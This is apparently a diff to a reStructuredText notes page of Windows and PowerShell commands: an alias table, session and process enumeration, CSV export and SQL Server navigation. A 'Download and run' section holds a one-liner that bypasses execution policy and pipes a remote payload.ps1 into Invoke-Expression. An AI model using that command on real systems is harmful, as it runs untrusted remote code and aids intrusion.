@@ -7,7 +7,7 @@ Here are some useful short commands for Windows systems that may be useful.
 Basic PowerShell commands
 -------------------------
 
-* ``sls`` (``Select-String``): look for a pattern:
+* ``sls`` (``Select-String``): look for a pattern.
 
   Example:
 
@@ -24,7 +24,7 @@ Basic PowerShell commands
   - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-6
   - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions?view=powershell-6
 
-* ``gcm`` (``Get-Command``): List cmdlets (PowerShell commands) matching a pattern
+* ``gcm`` (``Get-Command``): List cmdlets (PowerShell commands) matching a pattern.
 
   Example:
 
@@ -33,13 +33,63 @@ Basic PowerShell commands
       # List commands using "WMI" in their names
       gcm -noun *WMI*
 
+PowerShell also provides commands to browse the filesystem.
+Here is a correspondence table between PowerShell commands and commands from other systems, that are also available in PowerShell as aliases:
+
++-------------------------+--------------------------------------------------+----------------------------------------------+
+|                         |                     Aliases                      |                                              |
+|      cmdlet             +---------+-------------------+--------------------+ Description                                  |
+|                         |   PS    | ``cmd.exe``       |   UNIX shell       |                                              |
++=========================+=========+===================+====================+==============================================+
+| ``Get-Location``        | ``gl``  | ``pwd``           | ``pwd``            | Get the current node.                        |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Set-Location``        | ``sl``  | ``cd``, ``chdir`` | ``cd``, ``chdir``  | Change the current node.                     |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Get-ChildItem``       | ``gci`` | ``dir``           | ``ls``             | List the objects stored at the current node. |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``New-Item``            | ``ni``  | ``md``, ``mkdir`` | ``mkdir``          | Create a directory.                          |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Get-Item``            | ``gi``  |                   |                    | Return the properties of the current item.   |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Set-Item``            | ``si``  |                   |                    | Define the content of an item.               |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Copy-Item``           | ``cpi`` | ``copy``          | ``cp``             | Copy an object.                              |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Move-Item``           | ``mi``  | ``move``          | ``mv``             | Move an object.                              |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Rename-Item``         | ``rni`` | ``rn``            | ``ren``            | Rename an object.                            |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Remove-Item``         | ``ri``  | ``del``, ``rd``,  | ``rm``, ``rmdir``  | Remove an object.                            |
+|                         |         | ``erase``         |                    |                                              |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Get-Content``         | ``gc``  | ``type``          | ``cat``            | Get the content of an object.                |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Set-Content``         | ``sc``  |                   |                    | Define the content of an object.             |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Get-ItemProperty``    | ``gp``  |                   |                    | Return a property.                           |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Copy-ItemProperty``   | ``cpp`` |                   |                    | Copy a property.                             |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Move-ItemProperty``   | ``mp``  |                   |                    | Move a property.                             |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Rename-ItemProperty`` | ``rnp`` |                   |                    | Rename a property.                           |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Compare-Object``      |         | ``compare``       | ``diff``           | Compare several objects.                     |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Write-Output``        |         | ``write``         | ``echo``           | Print something to the standard output.      |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Invoke-WebRequest``   | ``iwr`` |                   | ``curl``, ``wget`` | Perform a HTTP request.                      |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+| ``Get-Help``            |         | ``help``          | ``man``            | Get the help associated with a cmdlet.       |
++-------------------------+---------+-------------------+--------------------+----------------------------------------------+
+
 
 Download and run
 ----------------
 
 Download and run a script
 
-* PowerShell::
+* PowerShell (``iex`` is an alias to ``Invoke-Expression``)::
 
     powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
 
@@ -141,6 +191,10 @@ Some commands to list and manage users and groups
     # query command
     query user
 
+    # Get information about the current sessions on a server
+    qwinsta
+    query session
+
     # PowerShell, with MS Exchange cmdlet
     # Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010
     Get-User | Export-CSV C:\Temp\AllUsers.csv -NoTypeInfo
@@ -159,10 +213,12 @@ Enumerate all processes::
     tasklist /v
     query process *
     Get-Process
+    # "gps" and "ps" are aliases of Get-Process
 
 Enumerate all services::
 
     Get-Service | Export-CSV C:\Temp\AllServices.csv -NoTypeInfo
+    gsv | epcsv C:\Temp\AllServices.csv -NoTypeInfo
 
 
 Local Group Policy
@@ -242,10 +298,12 @@ CSV and table viewer
 Display a simple CSV file in a simple GUI, from a PowerShell prompt::
 
     Import-Csv -Path file.csv | Out-GridView
+    ipcsv -Path file.csv | ogv
 
 In order to produce a CSV from a PowerShell command::
 
     ... | Sort-Object -Property Timestamp | Export-Csv file.csv -notypeinformation
+    ... | sort -Property Timestamp | epcsv file.csv -notypeinformation
 
 For a table in the CLI::
 
@@ -317,3 +375,10 @@ The following commands export the first rows of every table to files, once a ``$
         $SqlAdapter.Fill($DataSet)
         $DataSet.Tables[0] | Export-Csv $csvName -notypeinformation
     }
+
+On a SQL Server, it is also possible to create a virtual drive (cf. https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017):
+
+.. code-block:: sh
+
+    New-PSDrive -Name MYDB -Root SQLSERVER:\SQL\localhost\DEFAULT\Databases\mydb
+    Set-Location MYDB:\Tables\Users
